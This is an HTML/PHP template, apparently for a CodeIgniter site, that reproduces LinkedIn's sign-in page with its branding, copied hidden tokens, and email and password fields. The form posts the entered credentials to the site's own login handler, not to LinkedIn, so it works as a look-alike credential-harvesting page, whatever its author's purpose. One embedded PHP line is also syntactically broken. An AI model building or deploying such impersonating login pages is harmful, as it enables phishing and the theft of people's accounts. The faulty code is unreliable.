<body   class="en guest v2 ghome chrome-v5 chrome-v5-responsive background-v4 sticky-bg guest js" id="pagekey-uas-consumer-login-internal">
    <div id="header" class="global-header responsive-header nav-v5-2-header responsive-1" role="banner">
        <div id="top-header">
            <div class="wrapper">
                <h2 class="logo-container">
                     <a href="<?php echo base_url('index.php/register/register/page1');?>" class="logo" id="li-logo">LinkedIn Home</a>
                </h2>
                <ul class="nav main-nav guest-nav" role="navigation">
                              
                    <li class="nav-item">

                         <a href="<?php echo base_url('index.php/common/page/page5');?>" class="nav-link" rel="nofollow"><?php if(!is_null($username) echo $username;?></a>
                    </li>
                    <li class="nav-item">
                         <a href="<?php echo base_url('index.php/common/page/page6');?>" class="nav-link" rel="nofollow">Sign In</a>
                    </li>
                </ul>
            </div>
        </div>
        <div class="a11y-content">
            <a name="a11y-content" tabindex="0" id="a11y-content-link">Main content starts below.</a>
        </div>
    </div>

 <input id="inSlowConfig" type="hidden" value="false" />
 
 <div class="a11y-skip-nav-container">
 <div class="a11y-skip-nav a11y-hidden">
 <a href="#a11y-content" id="a11y-skip-nav-link">Skip to main content</a>
 </div>
  
 </div>

 
 <div id="body" class="" role="main">
 
 <div id="page-title1"><h1 class="titleset">Sign in to LinkedIn</h1></div>
 
<div class="wrapper hp-nus-wrapper">
  
<div id="global-error">
</div>
 
<div id="main" class="signin">

   <form action="<?php echo base_url();?>index.php/login/login/process" method="POST" name="login" novalidate="novalidate" id="login" class="ajax-form" data-jsenabled="check">
    
    <input type="hidden" name="isJsEnabled" value="false"/>

    <input type="hidden" name="source_app" value=""/>

    <input type="hidden" name="tryCount" id="tryCount" value=""/>

      <ul>
       <li>
            <label for="session_key-login" >Email address:</label>
            <div class="fieldgroup">
                <span class="error" id="session_key-login-error"></span>
                
                        <input type="text" name="session_key" value="" id="session_key-login" tabindex="1" data-ime-mode-disabled>
                    
            </div>
          </li>
        
        
          <li>
            <label for="session_password-login" >Password:</label>
            <div class="fieldgroup">
                <span class="error" id="session_password-login-error"></span>
                
                        <input type="password" name="session_password" value="" id="session_password-login" tabindex="2">
                    
                
                    <a id="forgot-password" href="page2.html" tracking="signin_fpwd" class="nav-link">Forgot password?</a>
                  
            </div>
          </li>
        
        <li class="button">
          <input type="submit" name="signin" value="Sign In" tabindex="3" class="btn-primary" id="btn-primary">
          <span class="space"> or <a href="<?php echo base_url('index.php/register/register/page5');?>" tracking="signin_join" class="nav-link">Join LinkedIn</a></span>
        </li>
      </ul>
           
          <input type="hidden" name="session_redirect" value="" id="session_redirect-login"><input type="hidden" name="csrfToken" value="ajax:8591499911237483509" id="csrfToken-login"><input type="hidden" name="sourceAlias" value="0_7r5yezRXCiA_H0CRD8sf6DhOjTKUNps5xGTqeX8EEoi" id="sourceAlias-login"><input type="hidden" name="goback" value=".nmp_*1_*1_*1_*1_*1_*1_*1_*1_*1_*1" id="goback-login">
          </form>
   
</div>
         </div>
</div>
